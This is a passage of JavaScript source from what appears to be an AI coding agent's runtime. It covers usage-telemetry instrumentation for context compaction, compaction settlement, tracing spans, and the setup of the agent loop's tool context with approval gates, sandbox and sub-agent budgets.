      "CC_RETRY_OBSERVER_ASYNC",
      "Child streaming retry observer must be synchronous",
    );
  }
}

function _assertStrictUsageObserver(observer, phase) {
  if (typeof observer !== "function") {
    throw _runtimeUsageBoundaryFailure(
      null,
      `CC_USAGE_${phase.toUpperCase()}_OBSERVER_REQUIRED`,
      `Strict child usage telemetry requires a synchronous ${phase} observer`,
    );
  }
}

function _autoCompactionUsageState(options) {
  let state = _autoCompactionUsageStates.get(options);
  if (!state) {
    state = { calls: [], callSequence: null };
    _autoCompactionUsageStates.set(options, state);
  }
  return state;
}

/**
 * Wrap only the compressor's actual provider-query seam. `shouldAutoCompact`,
 * microcompact, and extractive/count-only compaction never enter this wrapper,
 * so they cannot manufacture a billable-call boundary.
 */
function _instrumentAutoCompactorUsage(compactor, options) {
  if (!compactor || typeof compactor.llmQuery !== "function") return compactor;
  const installed = _autoCompactorInstrumentation.get(compactor);
  if (
    installed?.options === options &&
    compactor.llmQuery === installed.wrapper
  ) {
    return compactor;
  }

  const original = installed?.original || compactor.llmQuery;
  const state = _autoCompactionUsageState(options);
  const wrapper = async function instrumentedCompactionQuery(...args) {
    const workflowEffectId = _normalizeWorkflowEffectId(
      options.workflowEffectId,
    );
    const callSequence =
      Number.isSafeInteger(state.callSequence) && state.callSequence > 0
        ? state.callSequence
        : null;
    if (workflowEffectId && callSequence == null) {
      throw _runtimeUsageBoundaryFailure(
        null,
        "CC_COMPACTION_REQUEST_SEQUENCE_REQUIRED",
        "Workflow-bound semantic compaction requires a stable call sequence",
      );
    }
    const providerRequestId = _workflowProviderRequestId(
      workflowEffectId,
      "semantic-compaction",
      callSequence,
    );
    const call = {
      callId: _newModelUsageCallId("semantic-compaction"),
      provider: options.provider || "ollama",
      model: options.model || "unknown",
      source: "semantic-compaction",
      workflowEffectId,
      callSequence,
      providerRequestId,
      providerReceipt: null,
      observerError: null,
      observerFailed: false,
      boundaryNotified: false,
    };
    state.calls.push(call);
    const boundaryEvent = {
      type: "model-usage-started",
      callId: call.callId,
      provider: call.provider,
      model: call.model,
      source: call.source,
      ...(providerRequestId
        ? {
            workflowEffectId,
            callSequence,
            providerRequestId,
            requestIdentitySemantics: "trace-only",
          }
        : {}),
    };
    try {
      if (typeof options.onUsageBoundary === "function") {
        // Synchronous and before `original`: a host can durably append the
        // start row, and any append failure prevents provider spend.
        const observation = options.onUsageBoundary(boundaryEvent);
        if (observation && typeof observation.then === "function") {
          void Promise.resolve(observation).catch(() => {});
          const error = new Error(
            "Automatic compaction usage boundary observer must be synchronous",
          );
          error.code = "CC_USAGE_BOUNDARY_OBSERVER_ASYNC";
          throw error;
        }
        call.boundaryNotified = true;
      }
      if (
        providerRequestId &&
        typeof options.onProviderRequestBoundary === "function"
      ) {
        const observation = options.onProviderRequestBoundary(boundaryEvent);
        if (observation && typeof observation.then === "function") {
          void Promise.resolve(observation).catch(() => {});
          throw _runtimeUsageBoundaryFailure(
            null,
            "CC_PROVIDER_REQUEST_BOUNDARY_ASYNC",
            "Provider request boundary observer must be synchronous",
          );
        }
      }
    } catch (error) {
      call.observerError = error;
      call.observerFailed = true;
      throw error;
    }

    const requestBinding = providerRequestId
      ? Object.freeze({
          workflowEffectId,
          callSequence,
          source: "semantic-compaction",
          providerRequestId,
          requestIdentitySemantics: "trace-only",
        })
      : null;
    try {
      const result = await original.apply(
        this,
        requestBinding ? [...args, requestBinding] : args,
      );
      call.providerReceipt = providerRequestId
        ? _snapshotProviderRequestReceipt(
            result?.providerReceipt,
            providerRequestId,
            call.provider,
          )
        : null;
      return result;
    } catch (error) {
      if (workflowEffectId) {
        throw _workflowCompactionOutcomeUnknown(error);
      }
      throw error;
    }
  };

  try {
    compactor.llmQuery = wrapper;
  } catch (error) {
    if (options.strictUsageTelemetry === true) {
      throw _runtimeUsageBoundaryFailure(
        error,
        "CC_COMPACTION_USAGE_INSTRUMENTATION_REQUIRED",
        "Strict semantic compaction requires an instrumentable provider boundary",
      );
    }
    // A frozen injected compactor cannot be instrumented safely. Production
    // PromptCompressor instances are mutable; legacy injected fakes stay as-is.
    return compactor;
  }
  if (compactor.llmQuery === wrapper) {
    _autoCompactorInstrumentation.set(compactor, {
      original,
      options,
      wrapper,
    });
  } else if (options.strictUsageTelemetry === true) {
    throw _runtimeUsageBoundaryFailure(
      null,
      "CC_COMPACTION_USAGE_INSTRUMENTATION_REQUIRED",
      "Strict semantic compaction requires an instrumentable provider boundary",
    );
  }
  return compactor;
}

/**
 * Lazily build (and cache on `options`) the PromptCompressor used for in-loop
 * auto-compaction. Returns null when the feature is off or the module can't be
 * loaded — callers treat that as "don't compact". Cached (including null) so we
 * import once per run, not once per iteration.
 */
async function _getAutoCompactor(options) {
  if (Object.prototype.hasOwnProperty.call(options, "_autoCompactor")) {
    return _instrumentAutoCompactorUsage(options._autoCompactor, options);
  }
  let compressor = null;
  let canonicalRequired = false;
  try {
    const { feature } = await import("../lib/feature-flags.js");
    const { resolveCliContextMemoryCutover } =
      await import("../lib/context-memory-kernel/authority.js");
    const cutover = resolveCliContextMemoryCutover({
      env: options.contextMemoryEnv || process.env,
      scopeKey: options.sessionId
        ? `cli:session:${options.sessionId}`
        : "cli:live-session",
    });
    canonicalRequired = cutover.canonical;
    if (feature("PROMPT_COMPRESSOR") || cutover.canonical) {
      const { PromptCompressor } =
        await import("../harness/prompt-compressor.js");
      const llmQuery =
        typeof options.compactionLlmQuery === "function"
          ? options.compactionLlmQuery
          : options.chatFn
            ? null
            : async (prompt, requestBinding = null) => {
                const maxOutputTokens = Math.min(
                  4096,
                  Math.max(
                    256,
                    Number(options.compactionMaxOutputTokens) || 2048,
                  ),
                );
                const response = await chatWithTools(
                  [{ role: "user", content: prompt }],
                  {
                    ...options,
                    contextEngine: null,
                    contextMemorySkipPlanning: true,
                    enabledToolNames: [],
                    extraToolDefinitions: [],
                    hostManagedToolPolicy: null,
                    onToken: undefined,
                    onStall: undefined,
                    onStreamRetry: undefined,
                    providerRequestId:
                      requestBinding?.providerRequestId || undefined,
                    maxOutputTokens,
                  },
                );
                return {
                  summary: response?.message?.content || "",
                  usage: response?.usage || null,
                  provider: options.provider || "ollama",
                  model: options.model || "unknown",
                  providerReceipt: response?.providerReceipt || null,
                };
              };
      compressor = new PromptCompressor({
        model: options.model,
        provider: options.provider,
        llmQuery,
        summaryInputMaxChars: options.compactionInputMaxChars,
      });
      compressor = _instrumentAutoCompactorUsage(compressor, options);
      if (cutover.canonical) {
        const compatibilitySummarizer = compressor;
        const { compactLiveMessagesCanonical } =
          await import("../lib/context-memory-kernel/live-compaction.js");
        compressor = {
          canonicalKernel: true,
          shouldAutoCompact: (messages) =>
            compatibilitySummarizer.shouldAutoCompact(messages),
          compress: async (messages, compressOptions = {}) => {
            return compactLiveMessagesCanonical(messages, {
              compressor: compatibilitySummarizer,
              compressOptions,
              sessionId: options.sessionId,
              operationId: `auto-${randomUUID()}`,
              provider: options.provider,
              model: options.model,
              env: options.contextMemoryEnv || process.env,
              persist: options.persistCompaction !== false,
              trigger: "auto",
              ...(typeof options.onCompaction === "function"
                ? { commit: options.onCompaction }
                : {}),
            });
          },
        };
      }
    }
  } catch (error) {
    if (canonicalRequired) throw error;
    compressor = null;
  }
  try {
    options._autoCompactor = compressor;
  } catch {
    // options may be frozen — fine, we just re-import next iteration
  }
  return compressor;
}

function _compactionTokenUsage(stats) {
  const summaryUsage = stats?.summaryUsage;
  if (
    !summaryUsage ||
    typeof summaryUsage !== "object" ||
    Array.isArray(summaryUsage) ||
    !_isNonNegativeSafeInteger(summaryUsage.inputTokens) ||
    !_isNonNegativeSafeInteger(summaryUsage.outputTokens)
  ) {
    return null;
  }
  const optionalTokenCount = (key) => {
    if (!Object.prototype.hasOwnProperty.call(summaryUsage, key)) return 0;
    return _isNonNegativeSafeInteger(summaryUsage[key])
      ? summaryUsage[key]
      : null;
  };
  const cacheReadTokens = optionalTokenCount("cacheReadTokens");
  const cacheCreationTokens = optionalTokenCount("cacheCreationTokens");
  if (cacheReadTokens == null || cacheCreationTokens == null) return null;
  return {
    input_tokens: summaryUsage.inputTokens,
    output_tokens: summaryUsage.outputTokens,
    cache_read_input_tokens: cacheReadTokens,
    cache_creation_input_tokens: cacheCreationTokens,
  };
}

function _compactionUsageUnknownReason(stats) {
  return stats?.summaryUsageUnknownReason === "provider_usage_not_reported"
    ? "provider_usage_not_reported"
    : "provider_transport_outcome_unknown";
}

function _sameMessageSnapshot(messages, expectedMessages) {
  return (
    messages.length === expectedMessages.length &&
    messages.every((message, index) => message === expectedMessages[index])
  );
}

function _compactionSettlementError(code, message, cause = null) {
  const error = new Error(message, cause ? { cause } : undefined);
  error.code = code;
  return error;
}

/**
 * Settle one automatic compaction candidate before changing the live array.
 * Provider work has already completed when this runs. The actual canonical
 * compare-and-append remains synchronous, so no JavaScript turn can interleave
 * between the durable CAS and the in-memory replacement.
 */
async function _settleAutomaticCompaction({
  messages,
  liveExpectedMessages,
  authorityExpectedMessages,
  compacted,
  stats,
  options,
  trigger = "auto",
}) {
  if (!_sameMessageSnapshot(messages, liveExpectedMessages)) {
    throw _compactionSettlementError(
      "SESSION_REVISION_STALE",
      "Session messages changed while automatic compaction was running",
    );
  }

  let settlement = null;
  if (stats?.canonicalAlreadySettled === true) {
    settlement = stats.canonicalReceipt || null;
  } else if (typeof options.onCompaction === "function") {
    if (options.onCompaction.constructor?.name === "AsyncFunction") {
      throw _compactionSettlementError(
        "CC_COMPACTION_SETTLEMENT_ASYNC",
        "Automatic compaction settlement must be synchronous",
      );
    }
    settlement = options.onCompaction(stats, compacted, {
      expectedMessages: authorityExpectedMessages,
      liveExpectedMessages,
      trigger,
    });
  } else if (options.sessionId && options.persistCompaction !== false) {
    const store = await import("../harness/jsonl-session-store.js");
    if (!_sameMessageSnapshot(messages, liveExpectedMessages)) {
      throw _compactionSettlementError(
        "SESSION_REVISION_STALE",
        "Session messages changed before automatic compaction settlement",
      );
    }
    if (store.sessionExists(options.sessionId)) {
      settlement = store.appendCompactEventIfMessagesMatch(
        options.sessionId,
        {
          ...stats,
          trigger,
          messages: projectCanonicalResumeMessages(compacted, { strict: true }),
        },
        authorityExpectedMessages,
      );
    }
  }

  if (settlement && typeof settlement.then === "function") {
    // Observe a late rejection but never await/retry an authority settlement
    // whose commit state may already be unknown.
    void Promise.resolve(settlement).catch(() => {});
    throw _compactionSettlementError(
      "CC_COMPACTION_SETTLEMENT_ASYNC",
      "Automatic compaction settlement must be synchronous",
    );
  }
  if (!_sameMessageSnapshot(messages, liveExpectedMessages)) {
    throw _compactionSettlementError(
      "CC_COMPACTION_LOCAL_STATE_CHANGED",
      "Live messages changed after automatic compaction settlement",
    );
  }
  messages.splice(0, messages.length, ...compacted);
  return settlement;
}

/**
 * Run `fn` inside an OpenTelemetry span when `options.recorder` is attached,
 * else run it bare (zero overhead on the un-instrumented path). `onResult`
 * gets (span, result) to stamp result-derived attributes (token usage, tool
 * status). An exception is recorded on the span (category `errCategory`) and
 * re-thrown so the loop's own error handling is unchanged. Kept dependency-free
 * — the recorder is the OTel-shaped TelemetryRecorder passed in by the caller
 * (eval / a future `--otlp` agent flag); the real agent loop now EMITS
 * model/tool/retry spans, not just eval.
 */
async function _withSpan(recorder, name, attrs, fn, onResult, errCategory) {
  if (!recorder || typeof recorder.startSpan !== "function") return fn();
  const span = recorder.startSpan(name, attrs);
  try {
    const r = await fn();
    if (onResult) {
      try {
        onResult(span, r);
      } catch {
        /* attribute stamping is best-effort */
      }
    }
    span.end();
    return r;
  } catch (err) {
    try {
      span.recordException(err, errCategory || "error");
      span.end();
    } catch {
      /* span teardown is best-effort */
    }
    throw err;
  }
}

/** Normalize the varied provider usage shapes into input/output/cache tokens. */
function _usageTokens(usage) {
  if (!usage || typeof usage !== "object") return null;
  const input = usage.prompt_tokens ?? usage.input_tokens ?? null;
  const output = usage.completion_tokens ?? usage.output_tokens ?? null;
  const cacheRead =
    usage.cache_read_input_tokens ??
    usage.prompt_tokens_details?.cached_tokens ??
    null;
  const cacheWrite = usage.cache_creation_input_tokens ?? null;
  return { input, output, cacheRead, cacheWrite };
}

/**
 * Best-effort text of the first user prompt in a message list, for the
 * `--otlp-content` span attribute. Handles both string content and the
 * multimodal `[{type:"text",text}, …]` shape; returns "" when none is found.
 * Not exported (no shim-parity impact) — only the telemetry seam uses it.
 */
function extractInitialPromptText(messages) {
  if (!Array.isArray(messages)) return "";
  for (const msg of messages) {
    if (!msg || msg.role !== "user") continue;
    const content = msg.content;
    if (typeof content === "string") return content;
    if (Array.isArray(content)) {
      const text = content
        .filter((part) => part && part.type === "text" && part.text)
        .map((part) => part.text)
        .join("\n")
        .trim();
      if (text) return text;
    }
  }
  return "";
}

/**
 * Stable id for a permission GATE decision, so a denied/gated tool span can be
 * correlated with the decision that blocked it. Only gated results carry a
 * `policy` (allow-path tools execute with no distinct decision), so this returns
 * null when there's nothing to identify. Deterministic (call id + gate) — no
 * clock/RNG — so a consumer holding the tool-result's policy + tool_call_id can
 * recompute it. Not exported (no shim-parity impact) — only the telemetry seam
 * uses it.
 */
function permissionDecision(callId, tool, result) {
  return buildPermissionDecision({
    toolUseId: callId,
    tool,
    result,
  });
}

export async function* agentLoop(messages, options) {
  // Shared iteration budget — replaces hardcoded MAX_ITERATIONS.
  // When options.iterationBudget is provided (e.g. from parent agent),
  // the same budget instance is shared, so parent+child consume from one pool.
  const { IterationBudget, WarningLevel } =
    await import("../lib/iteration-budget.js");
  const budget = options.iterationBudget || new IterationBudget();
  const { HostResourceBudget } = await import("../lib/host-resource-budget.js");
  const hostResourceBudget =
    options.hostResourceBudget || new HostResourceBudget();
  const signal = options.signal || null;
  const workflowEffectId = _normalizeWorkflowEffectId(options.workflowEffectId);
  // Optional OpenTelemetry recorder (TelemetryRecorder). When present, the loop
  // emits model/tool/retry spans + a per-run counter; when absent, zero cost.
  const recorder = options.recorder || null;
  // Phase 5 run bookends — a stable runId lets envelope subscribers correlate
  // every tool_call / tool_result / message / ended event back to one run.
  // Minted BEFORE the tool context so hook envelopes can carry it as trace_id.
  const runId =
    options.runId ||
    `run-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  let automaticCompactionSettlementBlocked = false;
  let workflowChildEffectSequence = 0;

  const fileMutationScope = normalizeExactFileMutationScope(
    options.fileMutationScope,
    { cwd: options.cwd || process.cwd() },
  );
  const hermeticExecution = options.hermeticExecution === true;
  if (
    fileMutationScope &&
    (options.exactToolNames !== true || !hermeticExecution)
  ) {
    throw new Error(
      "exact file mutation scope requires exactToolNames=true and hermeticExecution=true",
    );
  }

  const effectiveToolOptions = hermeticExecution
    ? {
        ...options,
        hostManagedToolPolicy: null,
        extraToolDefinitions: [],
      }
    : options;
  const effectiveAllowedToolNames = Object.freeze(
    getEffectiveToolDefinitions(effectiveToolOptions).map(
      (tool) => tool.function.name,
    ),
  );
  if (
    fileMutationScope &&
    effectiveAllowedToolNames.some(
      (name) => !EXACT_FILE_MUTATION_SCOPE_TOOL_NAMES.has(name),
    )
  ) {
    throw new Error(
      "exact file mutation scope contains a tool outside the hermetic file-tool ceiling",
    );
  }
  const mcpCallLedger =
    options.mcpCallLedger ||
    createMcpCallLedger({ sink: options.mcpLedgerSink || null });
  const mcpConflictScheduler =
    options.mcpConflictScheduler || createMcpConflictScheduler();

  const toolContext = {
    hookDb: hermeticExecution ? null : options.hookDb || null,
    skillLoader: options.skillLoader || _defaultSkillLoader,
    skillOutcomeIndex: options.skillOutcomeIndex,
    skillVectorAuthority: options.skillVectorAuthority,
    skillRetrievalRevocationReader: options.skillRetrievalRevocationReader,
    // Hook-envelope tracing (P2 unified event bus): every settings-hook payload
    // fired during this run carries trace_id = this run's id; a spawned child
    // loop carries parent_id = the spawning run's id (threaded by
    // spawn_sub_agent via hookParentTraceId), so a subagent's hook events
    // correlate back to the parent trace. Null parent at the top level.
    hookTraceId: runId,
    hookParentId: options.hookParentTraceId || null,
    // Contract-driven skill allow-list (subagent capability INTERSECT). null =
    // unrestricted; [] = none; a list restricts run_skill/list_skills to those
    // ids/dirNames. Set by the spawn path from the resolved subagent contract.
    skillAllowlist: options.skillAllowlist ?? null,
    effectiveAllowedToolNames,
    fileMutationScope,
    hermeticExecution,
    cwd: options.cwd || process.cwd(),
    planManager: options.planManager || null,
    sessionId: options.sessionId || null,
    // One agentLoop invocation represents one user turn even when it performs
    // several model/tool iterations. Hosts may supply their persisted turn id;
    // otherwise the run id is the stable in-process binding.
    turnId: options.turnId || runId,
    hostManagedToolPolicy: hermeticExecution
      ? null
      : options.hostManagedToolPolicy || null,
    externalToolDescriptors: hermeticExecution
      ? null
      : options.externalToolDescriptors || null,
    externalToolExecutors: hermeticExecution
      ? null
      : options.externalToolExecutors || null,
    // Optional session-level Extension Tier gate. Hosts that can provide
    // capability/policy/permission/budget/UI signals opt in with
    // { enforce: true }; omitting it preserves the CLI's existing per-call
    // permission pipeline for backwards compatibility.
    toolAdmission: hermeticExecution ? null : options.toolAdmission || null,
    unattendedActionPolicy: hermeticExecution
      ? null
      : options.unattendedActionPolicy || null,
    // MCP tool DEFINITIONS the LLM sees (mcp__server__tool). Threaded here so a
    // spawn can inherit the parent's MCP tools into the child (filtered by the
    // contract's mcpServers allow-list). Otherwise consumed only at agentLoop.
    extraToolDefinitions: hermeticExecution
      ? null
      : options.extraToolDefinitions || null,
    mcpClient: hermeticExecution ? null : options.mcpClient || null,
    mcpHostClient: hermeticExecution
      ? null
      : options.mcpHostClient || options.mcpClient || null,
    mcpCallLedger,
    mcpConflictScheduler,
    mcpDispatchAdmission: hermeticExecution
      ? null
      : options.mcpDispatchAdmission || null,
    workflowEffectId,
    // A loop-local identity prevents one session's lazy instruction commits
    // from suppressing first-access delivery in another session at the same
    // cwd. Hosts may inject a stable identity across resumed turns.
    subtreeInstructionScope:
      options.subtreeInstructionScope || options.sessionId || Symbol(runId),
    // Parent memory source — a spawn can inherit the parent's hierarchical
    // memory DB into the child ONLY when the resolved contract grants memory
    // (context:fork from a memory-bearing parent, or explicit memory:true).
    // Read off this loop's context engine (REPL sets one with db+permanentMemory).
    memoryDb: options.contextEngine?.db ?? options.db ?? null,
    permanentMemory:
      options.contextEngine?.permanentMemory ?? options.permanentMemory ?? null,
    // Parent LLM config — forwarded to spawn_sub_agent so a delegated subagent
    // inherits the provider/key and can override just the model (cc agents `model:`).
    llmOptions: {
      provider: options.provider || null,
      model: options.model || null,
      baseUrl: options.baseUrl || null,
      apiKey: options.apiKey || null,
      ...(typeof options.onUsageBoundary === "function"
        ? { onUsageBoundary: options.onUsageBoundary }
        : {}),
      ...(typeof options.onUsageSettlement === "function"
        ? { onUsageSettlement: options.onUsageSettlement }
        : {}),
      ...(typeof options.onProviderReceipt === "function"
        ? { onProviderReceipt: options.onProviderReceipt }
        : {}),
      ...(typeof options.onStreamRetry === "function"
        ? { onStreamRetry: options.onStreamRetry }
        : {}),
      ...(typeof options.onToolCallBoundary === "function"
        ? { onToolCallBoundary: options.onToolCallBoundary }
        : {}),
      ...(typeof options.onToolCallSettlement === "function"
        ? { onToolCallSettlement: options.onToolCallSettlement }
        : {}),
      ...(options.strictUsageTelemetry === true
        ? { strictUsageTelemetry: true }
        : {}),
    },
    strictUsageTelemetry: options.strictUsageTelemetry === true,
    onUsageBoundary: options.onUsageBoundary || null,
    onUsageSettlement: options.onUsageSettlement || null,
    onProviderReceipt: options.onProviderReceipt || null,
    onToolCallBoundary: options.onToolCallBoundary || null,
    onToolCallSettlement: options.onToolCallSettlement || null,
    parentMessages: messages, // pass parent messages for sub-agent auto-condensation
    interaction: options.interaction || null,
    shellPolicyOverrides: options.shellPolicyOverrides || null,
    // autoMode.classifyAllShell (Claude-Code 2.1.193): when true, the built-in
    // verification allowlist (npm test / rg / …) is classified through the
    // ApprovalGate instead of fast-pathed, so no shell command auto-runs.
    classifyAllShell: options.classifyAllShell || false,
    // Persistent stream hosts must not block their own session-lease heartbeat
    // while a foreground shell command (notably a networked git push) runs.
    nonBlockingShell: options.nonBlockingShell === true,
    approvalGate: hermeticExecution ? null : options.approvalGate || null,
    shellConfirm: hermeticExecution ? null : options.shellConfirm || null,
    // Interactive sessions (the REPL) set this so run_code is gated through the
    // ApprovalGate like run_shell — a human can approve. Headless leaves it
    // false so run_code keeps its existing per-permission-mode behavior.
    interactiveApproval: options.interactiveApproval || false,
    additionalDirectories: hermeticExecution
      ? null
      : options.additionalDirectories || null,
    sandbox: options.sandbox || null,
    permissionRules: hermeticExecution ? null : options.permissionRules || null,
    permissionRulesProvider: hermeticExecution
      ? null
      : options.permissionRulesProvider || null,
    permissionConfirm: hermeticExecution
      ? null
      : options.permissionConfirm || null,
    settingsHooks: hermeticExecution ? null : options.settingsHooks || null,
    // Async-hook supervisor (REPL-owned): lets PostToolUse `async:true` hooks
    // run fire-and-forget instead of blocking the tool loop. Optional — when
    // absent, async PostToolUse hooks are simply skipped (never run sync).
    hookSupervisor: hermeticExecution ? null : options.hookSupervisor || null,
    autoCheckpoint: options.autoCheckpoint || false,
    checkpointSession:
      options.checkpointSession || options.sessionId || "agent",
    managedCheckpoint: options.managedCheckpoint === true,
    managedCheckpointStateDir: options.managedCheckpointStateDir || null,
    managedCheckpointExclusions: Array.isArray(
      options.managedCheckpointExclusions,
    )
      ? [...options.managedCheckpointExclusions]
      : [],
    // Sub-agent nesting level (0 = main loop); spawn_sub_agent caps at
    // MAX_SUB_AGENT_DEPTH using this.
    subAgentDepth: options.subAgentDepth || 0,
    // Shared TOTAL-sub-agent counter for the whole run. Reuse the parent's
    // instance (passed by reference) so every nested level draws from one pool;
    // the main loop seeds it. Bounds breadth, complementing the depth cap.
    subAgentBudget: options.subAgentBudget || {
      spawned: 0,
      max: MAX_SUB_AGENTS_PER_RUN,
    },
    // Optional local adapter for a host-created SessionResourceBudget. The
    // CLI root does not create one yet; when supplied, every nested child sees
    // the same object and cannot reset concurrency/spawn/depth totals.
    sessionBudget: options.sessionBudget || null,
    // Share bounded WebFetch cache and renderer/tool/event admission across
    // the main loop and every nested subagent. A host can tighten these limits
    // by supplying its own budget; otherwise the conservative defaults apply.
    hostResourceBudget,
    // This loop's EFFECTIVE subagent contract (set when this loop IS a spawned
    // sub-agent). Threaded so a nested spawn_sub_agent sees it as the parent
    // ceiling (tighten-only). null at the top level (no ceiling).
    subAgentContract: options.subAgentContract || null,
    // Abort signal — forwarded to background sub-agents so cancelling the
    // parent run also cancels children still running detached.
    signal,
    // Background sub-agents spawned THIS loop (spawn_sub_agent background:true).
    // id → { id, role, task, promise, settled, outcome }. Results are drained
    // into `messages` before each LLM call; the loop refuses to finish while
    // any are still running (it waits, injects, and gives the model one more
    // turn) so a background result can never be silently lost.
    backgroundSubAgents: new Map(),
    // A background child reports strict observer failure synchronously here,
    // before its promise rejection necessarily reaches the entry's `settled`
    // continuation. Provider/tool admission fences consult this latch directly.
    backgroundUsageFailureState: { error: null },
    // 用量归因: per-run sink for child-loop (spawn_sub_agent / isolated
    // run_skill) token usage. Child loops consume their own generator events,
    // so their real usage never reaches this loop's consumers — the spawn
    // wiring pushes it here and the loop drains it at iteration boundaries as
    // `token-usage` events carrying an `attribution` frame. Callers may pass
    // their own array to observe it directly.
    subAgentUsageSink: Array.isArray(options.subAgentUsageSink)
      ? options.subAgentUsageSink
      : [],
  };
  const backgroundSubAgents = toolContext.backgroundSubAgents;
  const backgroundUsageFailureState = toolContext.backgroundUsageFailureState;
  const subAgentUsageSink = toolContext.subAgentUsageSink;
  const lifecycleHookEmitter = hermeticExecution ? () => {} : emitHooksV2Event;

  throwIfAborted(signal);

  // ── Slot-filling phase ──────────────────────────────────────────────
  // Before calling the LLM, check if the user's message matches a known
  // intent with missing required parameters. If so, interactively fill them
  // and append the gathered context to the user message.
  if (!hermeticExecution && options.slotFiller && options.interaction) {
    const lastUserMsg = [...messages].reverse().find((m) => m.role === "user");
    if (lastUserMsg) {
      try {
        const { CLISlotFiller } = await import("../lib/slot-filler.js");
        const intent = CLISlotFiller.detectIntent(lastUserMsg.content);

        if (intent) {
          const requiredSlots = CLISlotFiller.getSlotDefinitions(
            intent.type,
          ).required;
          const missingSlots = requiredSlots.filter((s) => !intent.entities[s]);

          if (missingSlots.length > 0) {
            const result = await options.slotFiller.fillSlots(intent, {
              cwd: options.cwd || process.cwd(),
            });

            // Yield slot-filling events for each filled slot
            for (const slot of result.filledSlots) {
              yield {
                type: "slot-filling",
                slot,
                question: `Filled "${slot}" = "${result.entities[slot]}"`,
              };
            }

            // Append gathered context to the user message so the LLM has full info
            if (result.filledSlots.length > 0) {
              const contextParts = Object.entries(result.entities)
                .filter(([, v]) => v)
                .map(([k, v]) => `${k}: ${v}`);
              lastUserMsg.content += `\n\n[Context — user provided: ${contextParts.join(", ")}]`;
            }
          }
        }
      } catch (error) {
        if (isAbortError(error) || signal?.aborted) {
          throw error;
        }
        // Slot-filling failure is non-critical — proceed to LLM
      }
    }
  }

  // Phase 7 parity harness hook: tests can inject a mock LLM function via
  // `options.chatFn` to drive the loop deterministically without hitting a
  // real provider. Production code path is unchanged — the fallback is the
  // real `chatWithTools`.
  let llmCall = options.chatFn || chatWithTools;

  // Runnable-first auth recovery: if the resolved provider's key is missing /
  // wrong / expired, self-heal to a provider we can actually run (endpoint-
  // inferred, then env-keyed) instead of failing the turn. Opt out with
  // `runnableProviderFallback: false`. Transparent on the happy path.
  // A runnable fallback may perform an additional (and cross-provider) model
  // attempt inside one logical `llmCall`, where this generator cannot durably
  // bracket each transport attempt. Strict call-ledger sessions therefore
  // disable that recovery path and surface the configured provider's failure
  // as unknown. A workflow-bound request does the same: a hidden fallback
  // would be a second physical provider attempt under one durable effect.
  // Legacy sessions keep the existing self-healing behavior.
  if (
    options.runnableProviderFallback !== false &&
    options.strictUsageTelemetry !== true &&
    workflowEffectId == null
  ) {
    const { makeRunnableProviderFallback } =
      await import("../lib/runnable-provider.js");
    llmCall = makeRunnableProviderFallback(llmCall, {
      onFallback: ({ from, to, reason, fromModel, toModel }) => {
        // Telemetry: a provider/model fallback is a reliability signal — count
        // it (keyed by reason) so a run's OTLP export shows retry/fallback rate.
        if (recorder) recorder.counter("agent.model.fallback", 1, { reason });
        // Switching VENDORS (or relabelling via baseUrl) must NEVER be silent —
        // a user who configured volcengine deserves to know it ran on another
        // provider/model. Build a human message and hand it to the driver's
        // visible surfacer (IDE panel → a rendered `raw` line; REPL → a yellow
        // line) when provided; otherwise fall back to a clear stderr notice.
        const message =
          reason === "env-key"
            ? `"${from}" 鉴权失败，已临时切换到不同厂商 "${to}"（请检查 ${from} 的 API key：cc config set-secret llm.apiKey）。`
            : reason === "model-mismatch"
              ? `模型 "${fromModel}" 不属于 ${from}，已改用其默认模型 "${toModel}"（用 cc config set llm.model 设置正确的 ${from} 模型）。`
              : `provider 配置与 baseUrl 不一致，已按 baseUrl 切换到 "${to}"。`;
        const info = { from, to, reason, fromModel, toModel, message };
        if (typeof options.onProviderFallback === "function") {
          try {
            options.onProviderFallback(info);
          } catch {
            /* surfacing is best-effort */
          }
          return;
        }
        try {
          process.stderr.write(`\x1b[33m[provider] ${message}\x1b[0m\n`);
        } catch {
          /* notice is best-effort */
        }
      },
    });
  }

  // Workflow-tracing attributes (Claude-Code 2.1.202): stamp the run id (and
  // an optional caller-provided workflow name) onto EVERY span this run emits,
  // so a collector can group one run's model/tool spans into one workflow.
  if (recorder && typeof recorder.setDefaultAttribute === "function") {
    // Normalize the unified id set (P2 observability): every id is charset-
    // sanitized + length-capped, and only these allow-listed keys are stamped,
    // so span cardinality stays bounded and no content leaks in as an id.
    const telemetryCtx = {
      "workflow.run_id": runId,
      "workflow.name": options.workflowName || undefined,
      "session.id": options.sessionId || undefined,
      "agent.id": options.agentId || undefined,
      "parent_agent.id": options.parentAgentId || undefined,
    };
    // --otlp-content opt-in (P2): only when explicitly enabled do we feed the
    // initial prompt through the redactor with includeContent — so a debugger
    // can see which prompt a span belongs to. Default OFF omits the field
    // entirely (not just redacts it), keeping default OTLP output byte-identical.
    const includeContent = options.otlpIncludeContent === true;
    if (includeContent) {
      const promptText = extractInitialPromptText(messages);
      if (promptText) telemetryCtx.prompt = promptText;
    }
    const idAttrs = buildTelemetryAttributes(telemetryCtx, { includeContent });
    for (const [k, v] of Object.entries(idAttrs)) {
      recorder.setDefaultAttribute(k, v);
    }
  }
  yield {
    type: "run-started",
    runId,
    sessionId: options.sessionId || null,
  };

  // True once a Stop hook has forced a continuation — passed to the next Stop
  // hook as `stop_hook_active` so a well-behaved hook won't block forever.
  let stopHookActive = false;
  // True once we have already re-prompted a thinking-only turn (a turn that
  // produced extended-thinking but no visible text and no tool calls). The
  // one-shot guard means a model that keeps returning empty turns completes
  // rather than looping forever (the iteration budget is the hard backstop).
  let emptyThinkingReprompted = false;

  while (budget.hasRemaining()) {
    if (typeof toolContext.sessionBudget?.consumeTurn === "function") {
      const turnBudgetId = `turn:${createHash("sha256")
        .update(`${runId}:t${budget.consumed + 1}`, "utf8")
        .digest("hex")
        .slice(0, 48)}`;
      const admission = toolContext.sessionBudget.consumeTurn({
        id: turnBudgetId,
      });
      if (!admission?.ok) {
        throw sessionBudgetAdmissionError(
          admission?.reason,
          `turn ${budget.consumed + 1}`,
        );
      }
    }
    budget.consume();
    throwIfAborted(signal);

    // A detached child may fail its synchronous ledger write between parent
    // turns. Surface that original marked error before any further paid parent
    // provider call is admitted.
    _throwBackgroundUsageFailureState(backgroundUsageFailureState);
    _throwSettledBackgroundUsageFailure(backgroundSubAgents);

    // Surface attributed child-loop usage collected since the last boundary
    // (blocking spawns push during executeTool; background spawns push live).
    yield* _drainSubAgentUsage(subAgentUsageSink);

    // Emit progressive warnings (once per level)
    const level = budget.warningLevel();
    if (
